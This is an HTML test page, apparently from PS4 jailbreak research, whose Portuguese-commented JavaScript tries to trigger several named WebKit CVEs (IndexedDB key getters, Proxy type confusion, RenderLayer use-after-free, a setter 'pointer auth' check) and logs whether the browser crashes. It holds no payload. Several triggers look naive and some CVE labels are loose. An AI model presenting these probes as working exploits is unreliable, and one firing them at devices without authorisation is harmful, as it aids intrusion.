<!DOCTYPE html>
<html>
<head>
    <title>PS4 WebKit CVE Test Suite (No-JIT)</title>
    <style>
        body { background: #1a1a1a; color: #e0e0e0; font-family: monospace; padding: 20px; }
        h2 { border-bottom: 1px solid #555; padding-bottom: 10px; }
        .btn-group { margin-bottom: 20px; }
        button { 
            background: #333; color: #fff; border: 1px solid #666; 
            padding: 10px 15px; font-size: 16px; cursor: pointer; 
            margin-right: 10px; margin-bottom: 10px;
        }
        button:hover { background: #555; }
        button:disabled { opacity: 0.5; cursor: not-allowed; }
        #log { 
            background: #000; border: 1px solid #444; 
            padding: 10px; height: 400px; overflow-y: auto; 
            white-space: pre-wrap; font-size: 14px;
        }
        .vuln { color: #ff4444; font-weight: bold; }
        .safe { color: #4caf50; font-weight: bold; }
        .info { color: #2196f3; }
        .warn { color: #ffeb3b; }
        /* Para testes de RenderLayer */
        #render-container { position: absolute; top: -9999px; }
    </style>
</head>
<body>

    <h2>PS4 WebKit CVE Triggers (FW 12.00+)</h2>
    <p>Testes lógicos focados em bugs de DOM, Bindings e Lifecycle (sem JIT).</p>

    <div class="btn-group">
        <button onclick="test_CVE_2023_41993()">CVE-2023-41993 (IndexedDB)</button>
        <button onclick="test_CVE_2024_23222()">CVE-2024-23222 (Type Conf.)</button>
        <button onclick="test_RenderLayer_Group()">CVE-2023-2536x (RenderLayer)</button>
        <button onclick="test_CVE_2024_27834()">CVE-2024-27834 (Pointer Auth)</button>
    </div>

    <div id="log">Aguardando inicio...</div>
    <div id="render-container"></div>

    <script>
        const logDiv = document.getElementById('log');
        
        function log(msg, type = 'info') {
            const el = document.createElement('div');
            el.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
            el.className = type;
            logDiv.appendChild(el);
            logDiv.scrollTop = logDiv.scrollHeight;
        }

        // --- CVE-2023-41993: IndexedDB Bindings Issue ---
        // Tenta confundir o gerenciamento de memória ao usar chaves complexas no IndexedDB
        async function test_CVE_2023_41993() {
            log("INICIANDO: CVE-2023-41993 (IndexedDB Bindings)...", "info");
            try {
                const dbName = "CVE_2023_41993_Test";
                const request = indexedDB.open(dbName, 1);
                
                request.onupgradeneeded = (event) => {
                    const db = event.target.result;
                    if (!db.objectStoreNames.contains("store")) {
                        db.createObjectStore("store");
                    }
                };

                request.onsuccess = (event) => {
                    const db = event.target.result;
                    const tx = db.transaction("store", "readwrite");
                    const store = tx.objectStore("store");

                    // O Bug: Usar um array com getters maliciosos como CHAVE
                    let maliciousKey = [];
                    Object.defineProperty(maliciousKey, "0", {
                        get: () => {
                            // Tenta causar efeitos colaterais durante a conversão da chave
                            // Ex: Fechar o banco de dados ou limpar o array
                            try { db.close(); } catch(e){}
                            return "key";
                        }
                    });

                    try {
                        store.put("value", maliciousKey);
                        log("Comando 'put' executado. Se o browser não travar, pode estar mitigado.", "warn");
                    } catch(e) {
                        log(`Erro capturado (Seguro): ${e.message}`, "safe");
                    }
                };
            } catch(e) {
                log(`Erro geral: ${e.message}`, "safe");
            }
        }

        // --- CVE-2024-23222: Type Confusion (Object Lifecycle) ---
        // Tenta mudar o tipo de um objeto (Array -> Dicionário) durante acesso otimizado
        async function test_CVE_2024_23222() {
            log("INICIANDO: CVE-2024-23222 (Type Confusion)...", "info");
            let arr = [1.1, 2.2, 3.3]; // Array de Doubles
            
            // Tenta confundir o tipo via Proxy
            let p = new Proxy(arr, {
                get: (target, prop) => {
                    if (prop === "length") {
                        // Transição destrutiva: Adiciona propriedade string para mudar a estrutura interna
                        target[0] = {}; 
                        target.newProp = "slow";
                        return 0; // Retorna length falso
                    }
                    return target[prop];
                }
            });

            try {
                // Acesso que pode disparar o bug se o motor não checar o tipo novamente
                let val = Array.prototype.slice.call(p);
                log(`Resultado Slice: ${val}`, "info");
                
                if (val.length === 0 && arr[0].toString() === "[object Object]") {
                    log("Comportamento confuso detectado (Transição ocorreu durante operação).", "warn");
                } else {
                    log("Seguro: O motor lidou bem com o Proxy.", "safe");
                }
            } catch(e) {
                log(`Erro capturado: ${e.message}`, "safe");
            }
        }

        // --- CVE-2023-25360/61/62: RenderLayer Use-After-Free ---
        // Cria estruturas CSS complexas e remove elementos para tentar UAF no Layout
        async function test_RenderLayer_Group() {
            log("INICIANDO: RenderLayer Group (CVE-2023-25360/1/2)...", "info");
            const container = document.getElementById('render-container');
            
            try {
                // Setup: Elemento com propriedades de layout complexas
                let el = document.createElement('div');
                el.style.position = 'absolute';
                el.style.zIndex = '1'; // Cria RenderLayer
                el.style.overflow = 'scroll';
                el.innerHTML = '<div style="height:200px; width:200px;">CONTENT</div>';
                container.appendChild(el);

                // Trigger: Manipulação de DOM + Forçar Layout + Remoção
                // Tenta confundir o contador de referências do RenderLayer
                document.body.offsetLeft; // Força layout
                
                let child = el.firstElementChild;
                child.style.position = 'relative'; // Muda tipo de layer
                
                // Remove o pai enquanto acessa propriedades de layout
                el.remove();
                
                // Tenta acessar geometria do filho órfão (UAF potencial)
                let h = child.offsetHeight;
                
                log(`Operação de Layout concluída (Height: ${h}). Se não travou, provável safe.`, "safe");
            } catch(e) {
                log(`Erro RenderLayer: ${e.message}`, "warn");
            } finally {
                container.innerHTML = ""; // Limpeza
            }
        }

        // --- CVE-2024-27834: Pointer Authentication / Logic Bypass ---
        // Teste lógico para verificar integridade de ponteiros em objetos complexos
        async function test_CVE_2024_27834() {
            log("INICIANDO: CVE-2024-27834 (Logic Bypass)...", "info");
            
            // Criação de objeto com setters profundos
            let obj = { a: 1 };
            let val = 0;
            
            Object.defineProperty(obj, "b", {
                set: (v) => {
                    val = v;
                    // Tenta invalidar o objeto 'this' durante o set
                    obj = null; 
                    // Força GC
                    try { new ArrayBuffer(1024*1024); } catch(e){}
                }
            });

            try {
                // Atribuição que pode falhar se a referência 'obj' for perdida incorretamente
                obj.b = 10; 
                
                if (val === 10) {
                    log("Seguro: Atribuição funcionou, referência mantida.", "safe");
                } else {
                    log("ALERTA: Falha na lógica de atribuição.", "vuln");
                }
            } catch(e) {
                log(`Erro capturado: ${e.message}`, "safe");
            }
        }

    </script>
</body>
</html>
